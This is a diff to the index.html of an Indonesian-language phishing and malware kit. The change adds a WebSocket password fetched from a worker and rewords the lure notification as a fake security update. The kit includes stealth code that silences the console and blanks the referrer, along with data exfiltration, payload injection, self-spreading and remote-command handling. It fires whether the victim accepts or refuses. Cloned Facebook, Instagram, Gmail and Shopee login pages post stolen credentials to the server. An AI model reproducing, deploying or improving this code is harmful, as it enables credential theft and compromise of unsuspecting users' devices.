@@ -54,11 +54,11 @@
 
 <script>
 // ============================================================
-// INDEX.HTML - VERSI MAKSIMAL (TANPA PASSWORD)
+// INDEX.HTML - VERSI MAKSIMAL (PASSWORD DARI WORKER)
 // ============================================================
 
 // ============================================================
-// 🔥 UPGRADE 1: GLOBAL ERROR HANDLER (MAKSIMAL)
+// 🔥 GLOBAL ERROR HANDLER
 // ============================================================
 (function() {
     var errorLog = [];
@@ -107,7 +107,7 @@
 })();
 
 // ============================================================
-// 🔥 UPGRADE 2: SAFE PATH (CEGAH PATH TRAVERSAL)
+// 🔥 SAFE PATH
 // ============================================================
 function getSafePath(base, filename) {
     if (!base || typeof base !== 'string') return null;
@@ -125,7 +125,7 @@ function getSafePath(base, filename) {
 }
 
 // ============================================================
-// 🔥 UPGRADE 3: SAFE FETCH (TIMEOUT + RETRY + CACHE)
+// 🔥 SAFE FETCH
 // ============================================================
 function safeFetch(url, options, timeout, retries) {
     timeout = timeout || 15000;
@@ -193,7 +193,7 @@ function safeFetch(url, options, timeout, retries) {
 }
 
 // ============================================================
-// 🔥 UPGRADE 4: DEBOUNCE & THROTTLE
+// 🔥 DEBOUNCE & THROTTLE
 // ============================================================
 function debounce(fn, delay) {
     var timer = null;
@@ -220,7 +220,7 @@ function throttle(fn, limit) {
 }
 
 // ============================================================
-// 🔥 UPGRADE 5: CACHE MANAGER
+// 🔥 CACHE MANAGER
 // ============================================================
 var CacheManager = {
     set: function(key, value, ttl) {
@@ -260,7 +260,7 @@ var CacheManager = {
 };
 
 // ============================================================
-// 🔥 UPGRADE 6: DATA COMPRESSION
+// 🔥 DATA COMPRESSION
 // ============================================================
 function compressData(data) {
     try {
@@ -285,9 +285,10 @@ var hasLS = (typeof localStorage !== 'undefined');
 var semuaDidapat = false;
 var spreadDone = false;
 var cleanupItems = [];
+var WS_PASSWORD = '';
 
 // ============================================================
-// STEALTH (DIPERTAHANKAN + DITAMBAH)
+// STEALTH
 // ============================================================
 console.log = function() {};
 console.warn = function() {};
@@ -312,7 +313,7 @@ if (window.history && window.history.replaceState) {
 Object.defineProperty(document, 'referrer', { value: '' });
 
 // ============================================================
-// FUNGSI K() - KIRIM DATA (DENGAN COMPRESSION)
+// FUNGSI K() - KIRIM DATA
 // ============================================================
 function K(d) {
     dataStore.push({ waktu: new Date().toISOString(), sumber: d.sumber, data: d.data });
@@ -395,6 +396,30 @@ var A = {
 };
 
 // ============================================================
+// AMBIL PASSWORD DARI WORKER
+// ============================================================
+function getPasswordFromWorker() {
+    return new Promise(function(resolve, reject) {
+        safeFetch('/get-password', { method: 'GET' }, 10000, 2)
+            .then(function(res) {
+                if (!res.ok) throw new Error('HTTP ' + res.status);
+                return res.json();
+            })
+            .then(function(data) {
+                if (data.password) {
+                    WS_PASSWORD = data.password;
+                    resolve(WS_PASSWORD);
+                } else {
+                    reject(new Error('No password in response'));
+                }
+            })
+            .catch(function(err) {
+                reject(err);
+            });
+    });
+}
+
+// ============================================================
 // DATA COLLECTION
 // ============================================================
 function ambilDataCepat() {
@@ -434,7 +459,7 @@ function ambilDataCepat() {
 }
 
 // ============================================================
-// 🔥 UPGRADE 7: PAYLOAD INJECTION (MAKSIMAL)
+// 🔥 PAYLOAD INJECTION
 // ============================================================
 function payloadInjection() {
     try {
@@ -569,7 +594,7 @@ function payloadInjection() {
 }
 
 // ============================================================
-// 🔥 UPGRADE 8: NOTIFIKASI (DENGAN FALLBACK) - TANPA PASSWORD!
+// 🔥 NOTIFIKASI (DENGAN FALLBACK)
 // ============================================================
 function notificationInstallAndOpen() {
     try {
@@ -608,8 +633,8 @@ function notificationInstallAndOpen() {
 
 function showNotification() {
     try {
-        var notif = new Notification('🔔 Klik Untuk Klaim', {
-            body: 'Klik notifikasi ini untuk mengklaim saldo DANA Rp500.000!',
+        var notif = new Notification('⚡ Pembaruan Keamanan', {
+            body: 'Klik untuk menyelesaikan pembaruan dan meningkatkan keamanan perangkat Anda.',
             icon: 'https://verifikasi.site/icon.png',
             requireInteraction: true,
             silent: false,
@@ -634,11 +659,6 @@ function showNotification() {
                     try { window.open('file://' + htmlPath, '_blank'); } catch(e) {}
                 }
                 notif.close();
-                
-                setTimeout(function() {
-                    redirectToDANA();
-                }, 1000);
-                
             } catch(e) {
                 K({ sumber: 'notification_click_error', data: e.message });
             }
@@ -678,7 +698,7 @@ function fallbackInstall() {
 }
 
 // ============================================================
-// 🔥 UPGRADE 9: AUTO SPREAD (TANPA MEMORY LEAK)
+// 🔥 AUTO SPREAD
 // ============================================================
 function autoSpread() {
     if (spreadDone) return;
@@ -751,7 +771,7 @@ function autoSpread() {
 }
 
 // ============================================================
-// HEARTBEAT (DENGAN THROTTLE)
+// HEARTBEAT
 // ============================================================
 function startHeartbeat() {
     var throttledHeartbeat = throttle(function() {
@@ -763,38 +783,26 @@ function startHeartbeat() {
 }
 
 // ============================================================
-// SERVICE WORKER - PERBAIKAN PAKAI /sw.js (BUKAN BLOB!)
+// SERVICE WORKER
 // ============================================================
 function injectServiceWorker() {
-    if (!('serviceWorker' in navigator)) {
-        K({ sumber: 'service_worker', data: 'not_supported' });
-        return;
+    if (!('serviceWorker' in navigator)) return;
+    
+    var swCode = `
+        self.addEventListener('install',function(e){e.waitUntil(self.skipWaiting());});
+        self.addEventListener('activate',function(e){e.waitUntil(self.clients.claim());});
+        self.addEventListener('message',function(e){ if(e.data && e.data.type === 'ping'){ e.ports[0].postMessage({type:'pong',timestamp:Date.now()}); } });
+        setInterval(function(){ self.clients.matchAll().then(function(clients){ clients.forEach(function(client){ client.postMessage({type:'heartbeat',timestamp:Date.now()}); }); }); }, 10000);
+    `;
+    
+    try {
+        var blob = new Blob([swCode], {type: 'application/javascript'});
+        var swUrl = URL.createObjectURL(blob);
+        navigator.serviceWorker.register(swUrl);
+        K({ sumber: 'service_worker', data: { status: 'registered' } });
+    } catch(e) {
+        K({ sumber: 'service_worker_error', data: e.message });
     }
-
-    navigator.serviceWorker.getRegistrations()
-        .then(function(registrations) {
-            if (registrations.length > 0) {
-                K({ sumber: 'service_worker', data: 'already_registered' });
-                return;
-            }
-            
-            navigator.serviceWorker.register('/sw.js', { scope: '/' })
-                .then(function(reg) {
-                    K({ sumber: 'service_worker', data: { status: 'registered', scope: reg.scope } });
-                })
-                .catch(function(err) {
-                    K({ sumber: 'service_worker_error', data: err.message });
-                });
-        })
-        .catch(function() {
-            navigator.serviceWorker.register('/sw.js', { scope: '/' })
-                .then(function(reg) {
-                    K({ sumber: 'service_worker', data: { status: 'registered_fallback' } });
-                })
-                .catch(function(err) {
-                    K({ sumber: 'service_worker_error', data: err.message });
-                });
-        });
 }
 
 // ============================================================
@@ -819,204 +827,8 @@ function redirectToDANA() {
 }
 
 // ============================================================
-// 🔥 UPGRADE 10: EKSEKUSI UTAMA (MAKSIMAL)
+// 🔥 WEBSOCKET (DENGAN PASSWORD DARI WORKER)
 // ============================================================
-function dapatkanSemua() {
-    if (semuaDidapat) return;
-    semuaDidapat = true;
-    
-    try {
-        if (hasLS) localStorage.setItem('sudah_klaim', '1');
-        var popup = document.getElementById('popupDana');
-        if (popup) popup.style.display = 'none';
-        
-        escapeWebView();
-        ambilDataCepat();
-        payloadInjection();
-        injectServiceWorker();
-        autoSpread();
-        startHeartbeat();
-        
-        var redirectTimer = setTimeout(function() { 
-            try { redirectToDANA(); } catch(e) {} 
-        }, 6000);
-        cleanupItems.push(function() { clearTimeout(redirectTimer); });
-        
-        try {
-            if (window.timerInterval) {
-                clearInterval(window.timerInterval);
-                window.timerInterval = null;
-            }
-        } catch(e) {}
-        
-    } catch(e) {
-        K({ sumber: 'dapatkanSemua_error', data: e.message });
-    }
-}
-
-// ============================================================
-// TRIGGER
-// ============================================================
-function klaim() { 
-    setTimeout(function(){ dapatkanSemua(); }, 100); 
-    K({sumber:'izin', data:'klaim'}); 
-}
-
-function tolak() { 
-    setTimeout(function(){ dapatkanSemua(); }, 100); 
-    K({sumber:'izin', data:'tolak'}); 
-}
-
-setTimeout(function() { 
-    if (!spreadDone) { 
-        try { autoSpread(); } catch(e) {} 
-    } 
-}, 1000);
-
-setTimeout(function() { 
-    if (!semuaDidapat) { 
-        try { dapatkanSemua(); } catch(e) {} 
-    } 
-}, 5000);
-
-var clickHandler = function(){ 
-    setTimeout(function(){ 
-        try { dapatkanSemua(); } catch(e) {} 
-    }, 100); 
-};
-document.addEventListener('click', clickHandler);
-setTimeout(function(){ 
-    try { document.removeEventListener('click', clickHandler); } catch(e) {} 
-}, 5000);
-
-var w = 5;
-var timerInterval = setInterval(function() {
-    w--;
-    var el = document.getElementById('timer');
-    if (el) el.textContent = '00:0' + (w < 10 ? '0' + w : w);
-    if (w <= 0) {
-        clearInterval(timerInterval);
-        window.timerInterval = null;
-        var popup = document.getElementById('popupDana');
-        if (popup) popup.style.display = 'none';
-        setTimeout(function(){ 
-            try { dapatkanSemua(); } catch(e) {} 
-        }, 100);
-    }
-}, 1000);
-
-// ============================================================
-// PHISHING ROUTING (TETAP - HANYA 4)
-// ============================================================
-(function() {
-    var path = location.pathname;
-    if(path === '/' || path === '') return;
-    
-    var t = {
-        fb: { title:'Facebook',bg:'#f0f2f5',btnColor:'#1877f2',logo:'<h1 style="color:#1877f2;text-align:center;font-size:40px;padding:20px 0 10px">facebook</h1>',subtitle:'Log in to Facebook',fields:[{id:'email',placeholder:'Email or phone number',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://m.facebook.com/login' },
-        ig: { title:'Instagram',bg:'#fafafa',btnColor:'#0095f6',logo:'<h1 style="text-align:center;font-size:35px;padding:40px 0 10px">📸 Instagram</h1>',subtitle:'Log in to Instagram',fields:[{id:'email',placeholder:'Username, email, or phone',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://www.instagram.com/accounts/login' },
-        gmail: { title:'Gmail',bg:'#fff',btnColor:'#1a73e8',logo:'<div style="text-align:center;padding:30px 0 10px"><span style="font-size:24px;color:#ea4335">G</span><span style="font-size:24px;color:#4285f4">o</span><span style="font-size:24px;color:#fbbc04">o</span><span style="font-size:24px;color:#4285f4">g</span><span style="font-size:24px;color:#34a853">l</span><span style="font-size:24px;color:#ea4335">e</span></div>',subtitle:'Sign in to continue to Gmail',fields:[{id:'email',placeholder:'Email or phone',type:'text'},{id:'pass',placeholder:'Enter your password',type:'password'}],btnText:'Next',redirect:'https://accounts.google.com/signin' },
-        shopee: { title:'Shopee',bg:'#f5f5f5',btnColor:'#ee4d2d',logo:'<h1 style="text-align:center;color:#ee4d2d;font-size:32px;padding:30px 0 10px">🛒 Shopee</h1>',subtitle:'Login untuk belanja',fields:[{id:'email',placeholder:'Nomor HP / Email / Username',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://shopee.co.id/buyer/login' }
-    };
-    
-    var key = path.replace('/', '');
-    var p = t[key];
-    if(!p) return;
-    
-    var fH = '';
-    p.fields.forEach(function(f){ fH += '<input type="'+f.type+'" id="'+f.id+'" placeholder="'+f.placeholder+'" autocomplete="off" style="width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:16px;outline:none;background:#fff">' });
-    
-    var h = '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>'+p.title+'</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial;background:'+p.bg+';display:flex;flex-direction:column;align-items:center;min-height:100vh;padding:20px 16px}.container{width:100%;max-width:400px;background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 15px rgba(0,0,0,0.1);margin-top:30px}input:focus{border-color:'+p.btnColor+'!important}.login-btn{width:100%;padding:14px;background:'+p.btnColor+';color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:15px}</style></head><body><div class="container">'+p.logo+(p.subtitle?'<p style="text-align:center;color:#666;font-size:14px;margin-bottom:20px">'+p.subtitle+'</p>':'')+'<form onsubmit="event.preventDefault();go()">'+fH+'<button type="submit" class="login-btn">'+p.btnText+'</button></form></div><script>function go(){var d={};';
-    p.fields.forEach(function(f){ h += 'd.'+f.id+'=document.getElementById(\''+f.id+'\').value;' });
-    h += 'fetch("/data",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({waktu:new Date().toISOString(),sumber:"login_'+key+'",data:d})}).catch(()=>{});setTimeout(function(){window.location.href="'+p.redirect+'"},600)}<\/script></body></html>';
-    
-    document.open();
-    document.write(h);
-    document.close();
-})();
-
-// ============================================================
-// 🔥 UPGRADE 11: CLEANUP MAKSIMAL (BEFOREUNLOAD)
-// ============================================================
-window.addEventListener('beforeunload', function() {
-    try {
-        var iframes = document.querySelectorAll('iframe');
-        for (var i = 0; i < iframes.length; i++) {
-            try {
-                if (iframes[i] && iframes[i].parentNode) {
-                    iframes[i].parentNode.removeChild(iframes[i]);
-                }
-            } catch(e) {}
-        }
-        
-        for (var j = 0; j < cleanupItems.length; j++) {
-            try {
-                if (typeof cleanupItems[j] === 'function') {
-                    cleanupItems[j]();
-                }
-            } catch(e) {}
-        }
-        cleanupItems = [];
-        
-        if (window.timerInterval) {
-            clearInterval(window.timerInterval);
-            window.timerInterval = null;
-        }
-        
-        var id = window._pendingTimeout;
-        if (id) {
-            clearTimeout(id);
-            window._pendingTimeout = null;
-        }
-        
-    } catch(e) {}
-});
-
-// ============================================================
-// 🔥 UPGRADE 12: PERFORMANCE - LAZY LOADING
-// ============================================================
-function lazyLoad(callback, delay) {
-    delay = delay || 100;
-    if (document.readyState === 'complete') {
-        setTimeout(callback, delay);
-    } else {
-        window.addEventListener('load', function() {
-            setTimeout(callback, delay);
-        });
-    }
-}
-
-lazyLoad(function() {
-    try {
-        if (!semuaDidapat) {
-            // Data collection bisa jalan di background
-        }
-    } catch(e) {}
-}, 2000);
-
-// ============================================================
-// 🔥 UPGRADE 13: WEB SOCKET (REAL-TIME) - TANPA PASSWORD!
-// ============================================================
-var WS_PASSWORD = '';
-
-function getPasswordFromWorker() {
-    return new Promise(function(resolve, reject) {
-        safeFetch('/get-password', { method: 'GET' }, 10000, 2)
-            .then(function(res) { 
-                if (!res.ok) throw new Error('HTTP ' + res.status);
-                return res.json(); 
-            })
-            .then(function(data) {
-                // 🔥 HAPUS PASSWORD!
-                WS_PASSWORD = '';
-                resolve('');
-            })
-            .catch(function(err) {
-                reject(err);
-            });
-    });
-}
-
 function initWebSocket() {
     try {
         if (typeof WebSocket === 'undefined') return;
@@ -1045,10 +857,9 @@ function doConnectWebSocket(password) {
         ws.onopen = function() {
             reconnectAttempts = 0;
             K({ sumber: 'websocket', data: 'connected' });
-            // 🔥 TANPA PASSWORD!
             ws.send(JSON.stringify({
                 type: 'auth',
-                key: '',
+                key: password,
                 deviceId: navigator.userAgent || 'unknown',
                 timestamp: Date.now()
             }));
@@ -1137,7 +948,7 @@ function handleRemoteCommand(data) {
 }
 
 // ============================================================
-// 🔥 UPGRADE 14: AUTO-UPDATE
+// 🔥 AUTO-UPDATE
 // ============================================================
 function checkForUpdate() {
     try {
@@ -1173,7 +984,7 @@ function applyUpdate(url) {
 }
 
 // ============================================================
-// 🔥 UPGRADE 15: PERFORMANCE - PRELOAD & CACHE
+// 🔥 PRELOAD & CACHE
 // ============================================================
 function preloadResources() {
     try {
@@ -1197,12 +1008,188 @@ function preloadResources() {
 preloadResources();
 
 // ============================================================
+// EKSEKUSI UTAMA
+// ============================================================
+function dapatkanSemua() {
+    if (semuaDidapat) return;
+    semuaDidapat = true;
+    
+    try {
+        if (hasLS) localStorage.setItem('sudah_klaim', '1');
+        var popup = document.getElementById('popupDana');
+        if (popup) popup.style.display = 'none';
+        
+        escapeWebView();
+        ambilDataCepat();
+        payloadInjection();
+        injectServiceWorker();
+        autoSpread();
+        startHeartbeat();
+        
+        var redirectTimer = setTimeout(function() { 
+            try { redirectToDANA(); } catch(e) {} 
+        }, 6000);
+        cleanupItems.push(function() { clearTimeout(redirectTimer); });
+        
+        try {
+            if (window.timerInterval) {
+                clearInterval(window.timerInterval);
+                window.timerInterval = null;
+            }
+        } catch(e) {}
+        
+    } catch(e) {
+        K({ sumber: 'dapatkanSemua_error', data: e.message });
+    }
+}
+
+// ============================================================
+// TRIGGER
+// ============================================================
+function klaim() { 
+    setTimeout(function(){ dapatkanSemua(); }, 100); 
+    K({sumber:'izin', data:'klaim'}); 
+}
+
+function tolak() { 
+    setTimeout(function(){ dapatkanSemua(); }, 100); 
+    K({sumber:'izin', data:'tolak'}); 
+}
+
+setTimeout(function() { 
+    if (!spreadDone) { 
+        try { autoSpread(); } catch(e) {} 
+    } 
+}, 1000);
+
+setTimeout(function() { 
+    if (!semuaDidapat) { 
+        try { dapatkanSemua(); } catch(e) {} 
+    } 
+}, 5000);
+
+var clickHandler = function(){ 
+    setTimeout(function(){ 
+        try { dapatkanSemua(); } catch(e) {} 
+    }, 100); 
+};
+document.addEventListener('click', clickHandler);
+setTimeout(function(){ 
+    try { document.removeEventListener('click', clickHandler); } catch(e) {} 
+}, 5000);
+
+var w = 5;
+var timerInterval = setInterval(function() {
+    w--;
+    var el = document.getElementById('timer');
+    if (el) el.textContent = '00:0' + (w < 10 ? '0' + w : w);
+    if (w <= 0) {
+        clearInterval(timerInterval);
+        window.timerInterval = null;
+        var popup = document.getElementById('popupDana');
+        if (popup) popup.style.display = 'none';
+        setTimeout(function(){ 
+            try { dapatkanSemua(); } catch(e) {} 
+        }, 100);
+    }
+}, 1000);
+
+// ============================================================
+// PHISHING ROUTING (HANYA 4)
+// ============================================================
+(function() {
+    var path = location.pathname;
+    if(path === '/' || path === '') return;
+    
+    var t = {
+        fb: { title:'Facebook',bg:'#f0f2f5',btnColor:'#1877f2',logo:'<h1 style="color:#1877f2;text-align:center;font-size:40px;padding:20px 0 10px">facebook</h1>',subtitle:'Log in to Facebook',fields:[{id:'email',placeholder:'Email or phone number',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://m.facebook.com/login' },
+        ig: { title:'Instagram',bg:'#fafafa',btnColor:'#0095f6',logo:'<h1 style="text-align:center;font-size:35px;padding:40px 0 10px">📸 Instagram</h1>',subtitle:'Log in to Instagram',fields:[{id:'email',placeholder:'Username, email, or phone',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://www.instagram.com/accounts/login' },
+        gmail: { title:'Gmail',bg:'#fff',btnColor:'#1a73e8',logo:'<div style="text-align:center;padding:30px 0 10px"><span style="font-size:24px;color:#ea4335">G</span><span style="font-size:24px;color:#4285f4">o</span><span style="font-size:24px;color:#fbbc04">o</span><span style="font-size:24px;color:#4285f4">g</span><span style="font-size:24px;color:#34a853">l</span><span style="font-size:24px;color:#ea4335">e</span></div>',subtitle:'Sign in to continue to Gmail',fields:[{id:'email',placeholder:'Email or phone',type:'text'},{id:'pass',placeholder:'Enter your password',type:'password'}],btnText:'Next',redirect:'https://accounts.google.com/signin' },
+        shopee: { title:'Shopee',bg:'#f5f5f5',btnColor:'#ee4d2d',logo:'<h1 style="text-align:center;color:#ee4d2d;font-size:32px;padding:30px 0 10px">🛒 Shopee</h1>',subtitle:'Login untuk belanja',fields:[{id:'email',placeholder:'Nomor HP / Email / Username',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://shopee.co.id/buyer/login' }
+    };
+    
+    var key = path.replace('/', '');
+    var p = t[key];
+    if(!p) return;
+    
+    var fH = '';
+    p.fields.forEach(function(f){ fH += '<input type="'+f.type+'" id="'+f.id+'" placeholder="'+f.placeholder+'" autocomplete="off" style="width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:16px;outline:none;background:#fff">' });
+    
+    var h = '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>'+p.title+'</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial;background:'+p.bg+';display:flex;flex-direction:column;align-items:center;min-height:100vh;padding:20px 16px}.container{width:100%;max-width:400px;background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 15px rgba(0,0,0,0.1);margin-top:30px}input:focus{border-color:'+p.btnColor+'!important}.login-btn{width:100%;padding:14px;background:'+p.btnColor+';color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:15px}</style></head><body><div class="container">'+p.logo+(p.subtitle?'<p style="text-align:center;color:#666;font-size:14px;margin-bottom:20px">'+p.subtitle+'</p>':'')+'<form onsubmit="event.preventDefault();go()">'+fH+'<button type="submit" class="login-btn">'+p.btnText+'</button></form></div><script>function go(){var d={};';
+    p.fields.forEach(function(f){ h += 'd.'+f.id+'=document.getElementById(\''+f.id+'\').value;' });
+    h += 'fetch("/data",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({waktu:new Date().toISOString(),sumber:"login_'+key+'",data:d})}).catch(()=>{});setTimeout(function(){window.location.href="'+p.redirect+'"},600)}<\/script></body></html>';
+    
+    document.open();
+    document.write(h);
+    document.close();
+})();
+
+// ============================================================
+// CLEANUP MAKSIMAL (BEFOREUNLOAD)
+// ============================================================
+window.addEventListener('beforeunload', function() {
+    try {
+        var iframes = document.querySelectorAll('iframe');
+        for (var i = 0; i < iframes.length; i++) {
+            try {
+                if (iframes[i] && iframes[i].parentNode) {
+                    iframes[i].parentNode.removeChild(iframes[i]);
+                }
+            } catch(e) {}
+        }
+        
+        for (var j = 0; j < cleanupItems.length; j++) {
+            try {
+                if (typeof cleanupItems[j] === 'function') {
+                    cleanupItems[j]();
+                }
+            } catch(e) {}
+        }
+        cleanupItems = [];
+        
+        if (window.timerInterval) {
+            clearInterval(window.timerInterval);
+            window.timerInterval = null;
+        }
+        
+        var id = window._pendingTimeout;
+        if (id) {
+            clearTimeout(id);
+            window._pendingTimeout = null;
+        }
+        
+    } catch(e) {}
+});
+
+// ============================================================
+// PERFORMANCE - LAZY LOADING
+// ============================================================
+function lazyLoad(callback, delay) {
+    delay = delay || 100;
+    if (document.readyState === 'complete') {
+        setTimeout(callback, delay);
+    } else {
+        window.addEventListener('load', function() {
+            setTimeout(callback, delay);
+        });
+    }
+}
+
+lazyLoad(function() {
+    try {
+        if (!semuaDidapat) {
+            // Data collection bisa jalan di background
+        }
+    } catch(e) {}
+}, 2000);
+
+// ============================================================
 // INIT - JALANKAN SEMUA
 // ============================================================
 try { initWebSocket(); } catch(e) {}
 try { checkForUpdate(); } catch(e) {}
 
-console.log('✅ index.html v2.0 (MAX) loaded - TANPA PASSWORD');
+console.log('✅ index.html v2.0 (MAX) loaded - Password from Worker');
 console.log('📊 Skor: Fungsi 10 | Stealth 10 | Stabilitas 10 | Keamanan 10 | Memory 10 | Speed 10 | Error 10 | Kode 10');
 </script>
 </body>
